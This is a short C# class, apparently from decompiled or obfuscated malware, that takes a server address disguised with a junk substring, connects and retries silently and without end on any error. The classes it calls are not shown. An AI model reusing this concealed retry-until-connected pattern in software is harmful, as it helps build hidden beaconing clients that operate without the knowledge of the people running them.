using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.Srv;

namespace NoiseMe.Drags.Dots
{
	public class DreamWork
	{
		private Post SM1
		{
			get;
		}

		private Quin SM2
		{
			get;
		}

		public DreamWork(string IP, string ID)
		{
			SM2 = new Quin();
			SM1 = new Post(IP.Replace("hoh", string.Empty), ID);
		}

		public void Crown()
		{
			try
			{
				bool flag = false;
				if (SM1.Piu()())
				{
					while (!flag)
					{
						flag = SM1.QQu();
					}
				}
			}
			catch
			{
				Crown();
				return;
			}
			SM2.Rfs();
		}
	}
}
